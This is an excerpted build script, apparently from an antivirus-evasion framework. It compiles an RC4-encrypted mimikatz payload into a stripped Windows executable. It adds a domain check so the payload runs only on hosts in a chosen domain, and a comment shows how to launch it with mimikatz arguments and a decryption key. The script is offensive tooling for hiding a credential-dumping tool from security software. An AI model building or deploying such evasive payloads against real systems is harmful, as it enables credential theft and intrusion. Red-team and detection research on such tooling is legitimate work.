...
#DESCRIPTION_START
# Checks the DNS domain the target is in, and exits without executing the payload if not in specified domain (test.testdomain.info).
...
## terminate program if target is not in specified domain
add_evasion get_computer_domain test.testdomain.info
...
# compile to exe file
$win64_compiler -o output/checkdomain_rc4_mimikatz.exe source/avet.c
strip output/checkdomain_rc4_mimikatz.exe
...
# $ checkdomain_rc4_mimikatz_win64.exe [your mimikatz arguments, probably 'coffee']  [decryption key]
"
